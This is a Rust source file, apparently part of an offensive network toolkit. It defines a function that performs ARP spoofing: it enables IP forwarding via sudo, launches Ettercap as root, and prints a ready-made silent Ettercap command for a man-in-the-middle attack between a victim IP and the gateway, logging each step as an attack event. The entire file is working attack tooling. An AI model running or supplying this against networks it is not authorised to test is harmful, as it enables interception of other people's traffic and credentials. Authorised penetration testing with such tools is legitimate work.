use tokio::process::Command;
use colored::Colorize;
use tokio::time::{sleep, Duration};
use crate::data::logger;

pub async fn run_arp_spoof(
    interface: &str,
    victim_ip: &str,
    gateway_ip: &str,
    duration: u64,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("{}", format!("• Starting ARP Spoofing on '{}': Victim '{}', Gateway '{}'...", interface, victim_ip, gateway_ip).blue());

    println!("{}", "  1. Enabling IP forwarding...".dimmed());
    let _ = Command::new("sudo").arg("sysctl").arg("-w").arg("net.ipv4.ip_forward=1").output().await?;

    println!("{}", "  2. Starting Ettercap in graphical mode (or command-line for silent)...".dimmed());
    println!("{}", "  You may need to manually select sniffing interface and target in Ettercap GUI.".dimmed());
    println!("{}", "  For silent operation, use 'ettercap -T -q -i {} -M arp:remote /<victim_ip>// /<gateway_ip>//'".dimmed());

    let mut ettercap_command = Command::new("sudo");
    ettercap_command
        .arg("ettercap")
        .arg("-G");

    println!("{}", format!("  Executing: sudo ettercap -G (Graphical UI)").dimmed());
    let mut child = ettercap_command.spawn()?;

    println!("{}", "\nARP Spoofing initiated. Please configure Ettercap. (Press Ctrl+C to stop Ettercap)".yellow().bold());
    logger::log_attack_event("wifi_arp_spoof", "active", &format!("ARP Spoofing on {} (Victim: {}, Gateway: {}) initiated.", interface, victim_ip, gateway_ip)).await;

    if duration > 0 {
        sleep(Duration::from_secs(duration)).await;
        println!("{}", "\n• ARP Spoofing duration reached. Stopping Ettercap...".blue());
        let _ = child.kill().await;
    } else {
        println!("{}", "\nARP Spoofing will run indefinitely until stopped manually (Ctrl+C on Ettercap window).".dimmed());
        let _ = child.wait().await;
    }

    println!("{}", "  3. Disabling IP forwarding...".dimmed());
    let _ = Command::new("sudo").arg("sysctl").arg("-w").arg("net.ipv4.ip_forward=0").output().await?;
    println!("{}", "• ARP Spoofing clean up complete.".green());
    logger::log_attack_event("wifi_arp_spoof", "stopped", &format!("ARP Spoofing on {} (Victim: {}, Gateway: {}) stopped.", interface, victim_ip, gateway_ip)).await;

    Ok(())
}
